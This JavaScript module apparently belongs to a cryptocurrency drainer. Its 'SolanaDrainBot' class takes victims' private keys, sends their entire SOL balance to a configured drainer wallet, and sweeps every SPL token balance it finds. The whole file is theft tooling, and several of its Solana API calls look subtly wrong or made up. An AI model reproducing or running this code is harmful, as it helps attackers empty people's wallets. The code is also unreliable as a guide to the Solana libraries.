const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const { getAssociatedTokenAddress, getTokenAccount, createAssociatedTokenAccountInstruction, createTransferCheckedInstruction } = require('@solana/spl-token');
const config = require('./config');
const { sleep } = require('./utils');

class SolanaDrainBot {
    constructor() {
        this.connection = new Connection(config.solanaRpc, 'confirmed');
        this.walletKey = new PublicKey(config.solanaDrainerWallet);
    }

    async getBalance() {
        const balance = await this.connection.getBalance(this.walletKey);
        return balance / LAMPORTS_PER_SOL;
    }

    async getSolanaDrainTx(fromAddress, toAddress) {
        const fromPubkey = new PublicKey(fromAddress);
        const toPubkey = new PublicKey(toAddress);

        const balance = await this.connection.getBalance(fromPubkey);
        if (balance <= 5000) {
            console.log(`[SOL-DR] ${fromAddress}: balance too low to drain`);
            return null;
        }

        // Calculate amount to drain (leave a tiny amount for fee)
        const fee = 5000; // 5000 lamports for transaction fee
        const drainAmount = balance - fee;

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey,
                toPubkey,
                lamports: drainAmount
            })
        );

        return {
            transaction,
            fromPubkey,
            amount: drainAmount,
            toAddress
        };
    }

    async signAndSendDrainTx(fromPrivateKey, fromAddress, toAddress) {
        try {
            const result = await this.getSolanaDrainTx(fromAddress, toAddress);
            if (!result) return { success: false, reason: 'balance too low' };

            const { transaction, amount, toAddress: targetAddress } = result;

            // Sign the transaction with the source wallet's private key
            const fromKeypair = Buffer.from(fromPrivateKey, 'hex');
            const signer = fromKeypair;

            transaction.sign(signer);

            // Send the transaction
            const signature = await this.connection.sendTransaction(transaction, [signer], {
                skipPreflight: false,
                preflightCommitment: 'confirmed'
            });

            console.log(`[SOL-DR] Drained ${amount / LAMPORTS_PER_SOL} SOL from ${fromAddress} -> ${targetAddress}`);
            console.log(`[SOL-DR] Signature: ${signature}`);

            // Wait for confirmation
            const confirmation = await this.connection.confirmTransaction(signature);
            if (confirmation.value.err) {
                console.log(`[SOL-DR] Failed to confirm transaction: ${signature}`);
                return { success: false, reason: 'confirmation failed', signature };
            }

            await sleep(2000);
            return { success: true, signature, amount: amount / LAMPORTS_PER_SOL };
        } catch (error) {
            console.error(`[SOL-DR] Drain error for ${fromAddress}:`, error.message);
            return { success: false, reason: error.message };
        }
    }

    async drainAll(fromPrivateKey, fromAddress, toAddress) {
        return await this.signAndSendDrainTx(fromPrivateKey, fromAddress, toAddress);
    }

    async getSplTokenAccounts(fromAddress) {
        try {
            const fromPubkey = new PublicKey(fromAddress);
            const tokenAccounts = await this.connection.getTokenAccountsByOwner(
                fromPubkey,
                {
                    programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvx9QpR77sM6pU')
                }
            );
            return tokenAccounts.value.map(account => ({
                address: account.pubkey.toString(),
                mint: account.account.data.parsed.info.mint,
                balance: account.account.data.parsed.info.tokenAmount.uiAmountString,
                decimals: account.account.data.parsed.info.tokenAmount.decimals
            }));
        } catch (error) {
            console.error(`[SPL] Error getting token accounts for ${fromAddress}:`, error.message);
            return [];
        }
    }

    async drainSplToken(fromPrivateKey, fromAddress, tokenMint, toAddress) {
        try {
            const fromPubkey = new PublicKey(fromAddress);
            const toPubkey = new PublicKey(toAddress);
            const mintPubkey = new PublicKey(tokenMint);

            const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, fromPubkey);
            let toTokenAccount;
            try {
                toTokenAccount = await getAssociatedTokenAddress(mintPubkey, toPubkey);
            } catch {
                console.log(`[SPL-DR] Creating recipient token account for ${toAddress}`);
                const { transaction } = await this.connection.getRecentBlockhash();
                transaction.feePayer = this.walletKey;
                transaction.recentBlockhash = transaction.blockhash;

                toTokenAccount = await getAssociatedTokenAddress(mintPubkey, toPubkey);
                transaction.add(
                    createAssociatedTokenAccountInstruction(
                        this.walletKey,
                        toTokenAccount,
                        toPubkey,
                        mintPubkey
                    )
                );
            }

            const fromTokenAccountInfo = await this.connection.getAccountInfo(fromTokenAccount);
            if (!fromTokenAccountInfo || fromTokenAccountInfo.lamports === 0) {
                console.log(`[SPL-DR] No token account found for ${fromAddress}`);
                return { success: false, reason: 'no token account' };
            }

            const tokenAccount = await getTokenAccount(this.connection, fromTokenAccount);
            const balance = BigInt(tokenAccount.getRawState().amount);
            if (balance <= 0n) {
                console.log(`[SPL-DR] Zero balance for ${fromAddress}`);
                return { success: false, reason: 'zero balance' };
            }

            const decimals = tokenAccount.getRawState().decimals;
            const transaction = new Transaction();
            transaction.add(
                createTransferCheckedInstruction(
                    fromTokenAccount,
                    mintPubkey,
                    toTokenAccount,
                    fromPubkey,
                    balance,
                    decimals
                )
            );

            // Get recent blockhash
            const { blockhash } = await this.connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = this.walletKey;

            // Sign with fromPrivateKey
            const fromKeypair = Buffer.from(fromPrivateKey, 'hex');
            transaction.sign(fromKeypair);

            const signature = await this.connection.sendTransaction(transaction, [fromKeypair]);
            console.log(`[SPL-DR] Drained SPL token from ${fromAddress} -> ${toAddress}`);
            console.log(`[SPL-DR] Signature: ${signature}`);

            const confirmation = await this.connection.confirmTransaction(signature);
            if (confirmation.value.err) {
                console.log(`[SPL-DR] Failed to confirm SPL transaction: ${signature}`);
                return { success: false, reason: 'confirmation failed', signature };
            }

            await sleep(2000);
            return { success: true, signature, token: tokenMint };
        } catch (error) {
            console.error(`[SPL-DR] Drain error for ${fromAddress} (${tokenMint}):`, error.message);
            return { success: false, reason: error.message };
        }
    }
}

module.exports = { SolanaDrainBot };
